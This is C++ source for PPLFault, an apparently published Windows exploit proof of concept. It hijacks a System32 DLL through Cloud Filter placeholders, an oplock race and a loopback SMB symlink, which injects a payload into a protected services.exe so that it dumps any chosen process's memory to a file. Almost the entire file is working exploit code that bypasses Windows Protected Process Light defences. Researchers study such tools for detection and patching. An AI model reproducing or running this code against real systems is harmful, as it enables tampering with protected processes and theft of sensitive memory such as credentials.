// PPLFault by Gabriel Landau
// https://twitter.com/GabrielLandau

#include <phnt_windows.h>
#include <phnt.h>
#include <cfapi.h>
#include <pathcch.h>
#include <Shlwapi.h>

#include "MemoryCommand.h"
#include "Payload.h"
#include "DumpShellcode.h"
#include "Logging.h"

CF_CONNECTION_KEY gConnectionKey = { 0, };
WIN32_FILE_ATTRIBUTE_DATA gBenignFileAttributes = { 0, };
HANDLE hBenignFile = NULL;
HANDLE hPayloadFile = NULL;
HANDLE hCurrentFile = NULL;

const wchar_t* gpOplockFile = L"C:\\Windows\\System32\\devobj.dll";
HANDLE hOplockFile = NULL;
HANDLE hOplockEvent = NULL;

#define HIJACK_DLL_PATH L"C:\\Windows\\System32\\EventAggregation.dll"
#define HIJACK_DLL_PATH_BACKUP L"C:\\Windows\\System32\\EventAggregation.dll.bak"
#define PLACEHOLDER_DLL_DIR L"C:\\PPLFaultTemp\\"
#define PLACEHOLDER_DLL_BASENAME L"EventAggregationPH.dll"
#define PLACEHOLDER_DLL_PATH PLACEHOLDER_DLL_DIR  PLACEHOLDER_DLL_BASENAME
#define PLACEHOLDER_DLL_PATH_SMB L"\\\\127.0.0.1\\C$\\PPLFaultTemp\\" PLACEHOLDER_DLL_BASENAME
#define PAYLOAD_DLL_PATH L"C:\\PPLFaultTemp\\PPLFaultPayload.dll"

// Acquires a level 1 (aka exclusive) oplock to gpOplockFile and stores the resulting file handle in hOplockFile
bool AcquireOplock()
{
    HANDLE hFile = NULL;
    OVERLAPPED ovl = { NULL, };

    hFile = CreateFileW(
        gpOplockFile, FILE_READ_ATTRIBUTES, 
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
    if (INVALID_HANDLE_VALUE == hFile)
    {
        Log(Error, "CreateFile for oplock failed with GLE %u", GetLastError());
        return false;
    }

    ovl.hEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (DeviceIoControl(hFile, FSCTL_REQUEST_OPLOCK_LEVEL_1, NULL, 0, NULL, 0, NULL, &ovl))
    {
        Log(Error, "DeviceIoControl for oplock succeeded when it should not have");
        CloseHandle(hFile);
        CloseHandle(ovl.hEvent);
        return false;
    }

    if (ERROR_IO_PENDING != GetLastError())
    {
        Log(Error, "DeviceIoControl for oplock failed with unexpected GLE %u", GetLastError());
        CloseHandle(hFile);
        CloseHandle(ovl.hEvent);
        return false;
    }

    Log(Debug, "Acquired exclusive oplock to file: %ws", gpOplockFile);
    
    hOplockFile = hFile;
    hOplockEvent = ovl.hEvent;

    return true;
}

void ReleaseOplock()
{
    CloseHandle(hOplockFile);
    hOplockFile = NULL;
    CloseHandle(hOplockEvent);
    hOplockEvent = NULL;
}

// This is our CloudFilter rehydration callback
VOID CALLBACK FetchDataCallback (
    _In_ CONST CF_CALLBACK_INFO* CallbackInfo,
    _In_ CONST CF_CALLBACK_PARAMETERS* CallbackParameters
    )
{
    std::string buf;
    DWORD bytesRead = 0;
    NTSTATUS ntStatus = 0;
    HRESULT hRet = S_OK;

    static SRWLOCK sFetchDataCallback = SRWLOCK_INIT;

    Log(Debug, "FetchDataCallback called.");

    // Use an SRWLock to synchronize this function
    AcquireSRWLockExclusive(&sFetchDataCallback);

    // Read the current file's contents at requested offset into a local buffer
    // This could be either the benign file, or the payload file
    buf.resize(CallbackParameters->FetchData.RequiredLength.QuadPart);
    if (!SetFilePointerEx(hCurrentFile, CallbackParameters->FetchData.RequiredFileOffset, NULL, FILE_BEGIN))
    {
        ntStatus = NTSTATUS_FROM_WIN32(GetLastError());
        Log(Error, "SetFilePointerEx failed with GLE %u", GetLastError());
    }
    if (!ReadFile(hCurrentFile, &buf[0], (DWORD)buf.size(), &bytesRead, NULL))
    {
        ntStatus = NTSTATUS_FROM_WIN32(GetLastError());
        Log(Error, "ReadFile failed with GLE %u", GetLastError());
    }

    CF_OPERATION_INFO opInfo = { 0, };
    CF_OPERATION_PARAMETERS opParams = { 0, };

    opInfo.StructSize = sizeof(opInfo);
    opInfo.Type = CF_OPERATION_TYPE_TRANSFER_DATA;
    opInfo.ConnectionKey = CallbackInfo->ConnectionKey;
    opInfo.TransferKey = CallbackInfo->TransferKey;

    opParams.ParamSize = sizeof(opParams);
    opParams.TransferData.CompletionStatus = ntStatus;
    opParams.TransferData.Buffer = &buf[0];
    opParams.TransferData.Offset = CallbackParameters->FetchData.RequiredFileOffset;
    opParams.TransferData.Length.QuadPart = bytesRead;
    
    Log(Debug, "Hydrating %llu bytes at offset %llu", 
        opParams.TransferData.Length.QuadPart,
        opParams.TransferData.Offset.QuadPart);

    hRet = CfExecute(&opInfo, &opParams);
    if (!SUCCEEDED(hRet))
    {
        Log(Error, "CfExecute failed with HR 0x%08x GLE %u", hRet, GetLastError());
    }

    // Once the benign file has been fully read once, switch over to the payload
    if ((hCurrentFile == hBenignFile) &&
        ((CallbackParameters->FetchData.RequiredFileOffset.QuadPart + CallbackParameters->FetchData.RequiredLength.QuadPart) >=
            gBenignFileAttributes.nFileSizeLow))

    {
        Log(Debug, "Switching to payload");
        hCurrentFile = hPayloadFile;

        Log(Debug, "Emptying system working set");
        EmptySystemWorkingSet();

        Log(Debug, "Give the memory manager a moment to think");
        Sleep(100);

        buf.clear();
        buf.resize(gBenignFileAttributes.nFileSizeLow);

        if (!SetFilePointerEx(hCurrentFile, { 0,0 }, NULL, FILE_BEGIN))
        {
            ntStatus = NTSTATUS_FROM_WIN32(GetLastError());
            Log(Error, "SetFilePointerEx failed with GLE %u", GetLastError());
        }

        if (!ReadFile(hCurrentFile, &buf[0], (DWORD)buf.size(), &bytesRead, NULL))
        {
            ntStatus = NTSTATUS_FROM_WIN32(GetLastError());
            Log(Error, "ReadFile failed with GLE %u", GetLastError());
        }

        opParams.TransferData.Buffer = &buf[0];
        opParams.TransferData.Offset = { 0, 0 };
        opParams.TransferData.Length.QuadPart = bytesRead;

        Log(Debug, "Hydrating %llu PAYLOAD bytes at offset %llu",
            opParams.TransferData.Length.QuadPart,
            opParams.TransferData.Offset.QuadPart);

        hRet = CfExecute(&opInfo, &opParams);
        if (!SUCCEEDED(hRet))
        {
            Log(Error, "CfExecute failed with HR 0x%08x GLE %u", hRet, GetLastError());
        }

        // With the payload staged, release the oplock to allow the victim to execute
        ReleaseOplock();
    }

    ReleaseSRWLockExclusive(&sFetchDataCallback);
}

// Uses SeRestorePrivilege to move the given file
bool MoveFileWithPrivilege(const std::wstring& src, const std::wstring& dest)
{
    bool bResult = false;
    HANDLE hFile = INVALID_HANDLE_VALUE;
    BOOLEAN ignored = 0;
    NTSTATUS ntStatus = 0;
    PFILE_RENAME_INFO pRenameInfo = NULL;
    std::string buf;
    const std::wstring ntDest = L"\\??\\" + dest;

    ntStatus = RtlAdjustPrivilege(SE_BACKUP_PRIVILEGE, TRUE, FALSE, &ignored);
    if (0 != ntStatus)
    {
        Log(Error, "MoveFileWithPrivilege: RtlAdjustPrivilege(SE_BACKUP_PRIVILEGE) failed with NTSTATUS 0x%08x", ntStatus);
        goto Cleanup;
    }

    ntStatus = RtlAdjustPrivilege(SE_RESTORE_PRIVILEGE, TRUE, FALSE, &ignored);
    if (0 != ntStatus)
    {
        Log(Error, "MoveFileWithPrivilege: RtlAdjustPrivilege(SE_RESTORE_PRIVILEGE) failed with NTSTATUS 0x%08x", ntStatus);
        goto Cleanup;
    }

    hFile = CreateFileW(
        src.c_str(), 
        SYNCHRONIZE | DELETE, 
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 
        NULL, 
        OPEN_EXISTING, 
        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OPEN_REPARSE_POINT | FILE_FLAG_BACKUP_SEMANTICS, 
        NULL);
    if (INVALID_HANDLE_VALUE == hFile)
    {
        Log(Error, "MoveFileWithPrivilege: CreateFile failed with GLE %u", GetLastError());
        goto Cleanup;
    }

    buf.resize(sizeof(FILE_RENAME_INFO) + (ntDest.size() * sizeof(wchar_t)));
    pRenameInfo = (PFILE_RENAME_INFO)&buf[0];
    pRenameInfo->FileNameLength = (DWORD)(ntDest.size() * sizeof(wchar_t));
    memcpy(pRenameInfo->FileName, &ntDest[0], pRenameInfo->FileNameLength);

    if (!SetFileInformationByHandle(hFile, FileRenameInfo, pRenameInfo, (DWORD)buf.size()))
    {
        Log(Error, "MoveFileWithPrivilege: SetFileInformationByHandle failed with GLE %u", GetLastError());
        goto Cleanup;
    }

    bResult = true;

Cleanup:
    if (INVALID_HANDLE_VALUE != hFile)
    {
        CloseHandle(hFile);
    }

    return bResult;
}

bool FileExists(const std::wstring& path)
{
    return (INVALID_FILE_ATTRIBUTES != GetFileAttributesW(path.c_str()));
}

// Replace HIJACK_DLL_PATH symlink to PLACEHOLDER_DLL_PATH_SMB
bool InstallSymlink()
{
    // Make sure PLACEHOLDER exists
    if (!FileExists(PLACEHOLDER_DLL_PATH))
    {
        Log(Error, "InstallSymlink: Placeholder does not exist.  Refusing to install symlink.  GLE: %u", GetLastError());
        return false;
    }
    
    // Move HIJACK => BACKUP
    if (!MoveFileWithPrivilege(HIJACK_DLL_PATH, HIJACK_DLL_PATH_BACKUP))
    {
        Log(Error, "InstallSymlink: MoveFileExW failed with GLE: %u", GetLastError());
        return false;
    }
    
    // Symlink HIJACK => PLACEHOLDER over SMB
    if (!CreateSymbolicLinkW(HIJACK_DLL_PATH, PLACEHOLDER_DLL_PATH_SMB, 0))
    {
        Log(Error, "InstallSymlink: CreateSymbolicLinkW failed with GLE: %u", GetLastError());
        return false;
    }

    return true;
}

// Reverts the changes done by InstallSymlink()
bool CleanupSymlink()
{
    // Delete PLACEHOLDER
    (void)DeleteFile(PLACEHOLDER_DLL_PATH);

    // Make sure BACKUP exists before attempting to restore
    if (!FileExists(HIJACK_DLL_PATH_BACKUP))
    {
        Log(Debug, "No cleanup necessary.  Backup does not exist.");
        return false;
    }

    // Delete symlink
    (void)DeleteFile(HIJACK_DLL_PATH);

    // Restore BACKUP => HIJACK
    if (!MoveFileWithPrivilege(HIJACK_DLL_PATH_BACKUP, HIJACK_DLL_PATH))
    {
        Log(Error, "InstallSymlink: MoveFileExW failed with GLE: %u", GetLastError());
        return false;
    }
    
    return true;
}

// Launches services.exe as WinTcb-Light and waits up to 60s for it
bool SpawnPPL()
{
    std::wstring childPath = L"C:\\Windows\\System32\\services.exe";
    STARTUPINFOW si = { 0, };
    PROCESS_INFORMATION pi = { 0, };
    DWORD dwResult = 0;

    si.cb = sizeof(si);

    if (!CreateProcessW(childPath.c_str(), NULL, NULL, NULL, FALSE, CREATE_PROTECTED_PROCESS, NULL, NULL, &si, &pi))
    {
        Log(Error, "SpawnPPL: CreateProcessW failed with GLE: %u", GetLastError());
        return false;
    }

    Log(Info, "SpawnPPL: Waiting for child process to finish.");
    
    dwResult = WaitForSingleObject(pi.hProcess, 60 * 1000);
    if (WAIT_OBJECT_0 != dwResult)
    {
        Log(Error, "SpawnPPL: WaitForSingleObject returned %u.  Expected WAIT_OBJECT_0.  GLE: %u", dwResult, GetLastError());
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return true;
}

// Is this a valid PID?
bool IsValidPID(DWORD dwProcessId)
{
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, dwProcessId);
    if (NULL == hProcess)
    {
        return FALSE;
    }
    CloseHandle(hProcess);
    return TRUE;
}

int wmain(int argc, wchar_t* argv[])
{
    int result = 1;
    DWORD dwTargetProcessId = 0;
    DWORD bytesWritten = 0;
    DWORD ignored = 0;
    HRESULT hRet = S_OK;
    CF_CONNECTION_KEY key = { 0 };
    ULONGLONG startTime = GetTickCount64();
    ULONGLONG endTime = 0;
    std::wstring dumpPath;
    std::string payloadBuf;
   
    // Handle verbose logging
    if (argc >= 2 && (0 == _wcsicmp(L"-v", argv[1])))
    {
        SetLogLevel(LogLevel::Debug);
        argc--;
        argv++;
    }

    if (argc < 3)
    {
        printf("Usage: %ws [-v] <PID> <Dump Path>\n", argv[0]);
        return 1;
    }

    // Extract args
    dwTargetProcessId = _wtoi(argv[1]);
    dumpPath = argv[2];
    if (!IsValidPID(dwTargetProcessId))
    {
        Log(Error, "This doesn't appear to be a valid PID: %u", dwTargetProcessId);
        return 1;
    }

    // Clean up from any previous failed runs
    (void)CleanupSymlink();
    (void)CreateDirectoryW(PLACEHOLDER_DLL_DIR, NULL);

    hBenignFile = CreateFileW(HIJACK_DLL_PATH, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (INVALID_HANDLE_VALUE == hBenignFile)
    {
        Log(Error, "Failed to open file with GLE %u: %ws", GetLastError(), HIJACK_DLL_PATH);
        return 1;
    }

    hPayloadFile = CreateFileW(PAYLOAD_DLL_PATH, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_DELETE_ON_CLOSE, NULL);
    if (INVALID_HANDLE_VALUE == hPayloadFile)
    {
        Log(Error, "Failed to open file with GLE %u: %ws", GetLastError(), PAYLOAD_DLL_PATH);
        return 1;
    }

    hCurrentFile = hBenignFile;

    // Create the payload using the benign file
    if (!BuildPayload(hBenignFile, payloadBuf, dwTargetProcessId, dumpPath.c_str()))
    {
        Log(Error, "Failed to build payload");
        return 1;
    }

    if (!WriteFile(hPayloadFile, payloadBuf.data(), (DWORD)payloadBuf.size(), &bytesWritten, NULL) ||
        (bytesWritten != payloadBuf.size()))
    {
        Log(Error, "Failed to write payload file with GLE %u: %ws", GetLastError(), PAYLOAD_DLL_PATH);
        return 1;
    }

    // CloudFilter APIs based on https://googleprojectzero.blogspot.com/2021/01/windows-exploitation-tricks-trapping.html
    CF_SYNC_REGISTRATION syncReg = { 0 };
    syncReg.StructSize = sizeof(CF_SYNC_REGISTRATION);
    syncReg.ProviderName = L"CloudTest";
    syncReg.ProviderVersion = L"1.0";
    // {119C6523-407B-446B-B0E3-E03011178F50}
    syncReg.ProviderId = { 0x119c6523, 0x407b, 0x446b, { 0xb0, 0xe3, 0xe0, 0x30, 0x11, 0x17, 0x8f, 0x50 } };

    CF_SYNC_POLICIES policies = { 0 };
    policies.StructSize = sizeof(CF_SYNC_POLICIES);
    policies.HardLink = CF_HARDLINK_POLICY_ALLOWED;
    policies.Hydration.Primary = CF_HYDRATION_POLICY_PARTIAL;
    policies.Hydration.Modifier = CF_HYDRATION_POLICY_MODIFIER_NONE;
    policies.InSync = CF_INSYNC_POLICY_NONE;
    policies.PlaceholderManagement = CF_PLACEHOLDER_MANAGEMENT_POLICY_DEFAULT;
    policies.Population.Primary = CF_POPULATION_POLICY_PARTIAL;

    hRet = CfRegisterSyncRoot(PLACEHOLDER_DLL_DIR, &syncReg, &policies, CF_REGISTER_FLAG_DISABLE_ON_DEMAND_POPULATION_ON_ROOT);
    if (!SUCCEEDED(hRet))
    {
        Log(Error, "CfRegisterSyncRoot failed with HR 0x%08x GLE %u", hRet, GetLastError());
        return 1;
    }

    // Connect our callback to the synchronization root
    CF_CALLBACK_REGISTRATION cbReg[2] = {};
    cbReg[0].Callback = FetchDataCallback;
    cbReg[0].Type = CF_CALLBACK_TYPE_FETCH_DATA;
    cbReg[1].Type = CF_CALLBACK_TYPE_NONE;

    hRet = CfConnectSyncRoot(PLACEHOLDER_DLL_DIR, cbReg, NULL, CF_CONNECT_FLAG_NONE, &gConnectionKey);
    if (!SUCCEEDED(hRet))
    {
        CfUnregisterSyncRoot(PLACEHOLDER_DLL_DIR);
        Log(Error, "CfConnectSyncRoot failed with HR 0x%08x GLE %u", hRet, GetLastError());
        return 1;
    }

    if (!GetFileAttributesExW(HIJACK_DLL_PATH, GetFileExInfoStandard, &gBenignFileAttributes))
    {
        Log(Error, "GetFileAttributesExW on benign file failed with GLE %u", hRet, GetLastError());
        return 1;
    }

    // Create placeholder
    CF_PLACEHOLDER_CREATE_INFO phInfo = { 0, };
    phInfo.FsMetadata.FileSize.HighPart = gBenignFileAttributes.nFileSizeHigh;
    phInfo.FsMetadata.FileSize.LowPart = gBenignFileAttributes.nFileSizeLow;
    phInfo.FsMetadata.BasicInfo.FileAttributes = gBenignFileAttributes.dwFileAttributes;
    phInfo.FsMetadata.BasicInfo.CreationTime.LowPart = gBenignFileAttributes.ftCreationTime.dwLowDateTime;
    phInfo.FsMetadata.BasicInfo.CreationTime.HighPart = gBenignFileAttributes.ftCreationTime.dwHighDateTime;
    phInfo.RelativeFileName = PLACEHOLDER_DLL_BASENAME;
    phInfo.Flags = CF_PLACEHOLDER_CREATE_FLAG_SUPERSEDE | CF_PLACEHOLDER_CREATE_FLAG_MARK_IN_SYNC;
    phInfo.FileIdentityLength = 0x130;
    phInfo.FileIdentity = malloc(phInfo.FileIdentityLength);

    DWORD processed = 0;
    hRet = CfCreatePlaceholders(PLACEHOLDER_DLL_DIR, &phInfo, 1, CF_CREATE_FLAG_STOP_ON_ERROR, &processed);
    if (!SUCCEEDED(hRet) || (1 != processed))
    {
        CfUnregisterSyncRoot(PLACEHOLDER_DLL_DIR);
        Log(Error, "CfCreatePlaceholders failed with HR 0x%08x GLE %u", hRet, GetLastError());
        return 1;
    }

    // Replace target file with a symlink over loopback SMB to the placeholder file
    if (!InstallSymlink())
    {
        Log(Error, "InstallSymlink failed.  Aborting.");
        return 1;
    }

    Log(Debug, "Benign: %ws", HIJACK_DLL_PATH_BACKUP);
    Log(Debug, "Payload: %ws", PAYLOAD_DLL_PATH);
    Log(Debug, "Placeholder: %ws", PLACEHOLDER_DLL_PATH);

    if (!AcquireOplock())
    {
        goto Cleanup;
    }

    // Remove any old dump files
    if (FileExists(dumpPath.c_str()))
    {
        if (DeleteFileW(dumpPath.c_str()))
        {
            Log(Info, "Removed old dump file: %ws", dumpPath.c_str());
        }
        else
        {
            Log(Error, "Failed to remove old dump file: %ws", dumpPath.c_str());
            goto Cleanup;
        }
    }

    Log(Info, "Ready.  Spawning WinTcb.");
    if (!SpawnPPL())
    {
        goto Cleanup;
    }

    if (!FileExists(dumpPath.c_str()))
    {
        Log(Error, "Did not find expected dump file: %ws", dumpPath.c_str());
        goto Cleanup;
    }

    // Print final report
    {
        WIN32_FILE_ATTRIBUTE_DATA dumpAttr = { 0, };
        ULARGE_INTEGER uli = { 0, };
        WCHAR bytesPretty[32] = { 0, };

        if (!GetFileAttributesExW(dumpPath.c_str(), GetFileExInfoStandard, &dumpAttr))
        {
            Log(Error, "Failed to find dump file attributes with GLE %u", GetLastError());
            goto Cleanup;
        }

        uli.LowPart = dumpAttr.nFileSizeLow;
        uli.HighPart = dumpAttr.nFileSizeHigh;

        Log(Info, "Dump saved to: %ws", dumpPath.c_str());

        if (!StrFormatByteSizeW(uli.QuadPart, bytesPretty, _countof(bytesPretty)))
        {
            Log(Warning, "StrFormatByteSizeW failed with GLE %u", GetLastError());
        }
        else
        {
            Log(Info, "Dump is %ws", bytesPretty);
        }

        endTime = GetTickCount64();
        Log(Info, "Operation took %u ms", endTime - startTime);
    }

    result = 0;

Cleanup:
    ReleaseOplock();
    Sleep(100);
    CfUnregisterSyncRoot(PLACEHOLDER_DLL_DIR);
    CleanupSymlink();
    
    return result;
}


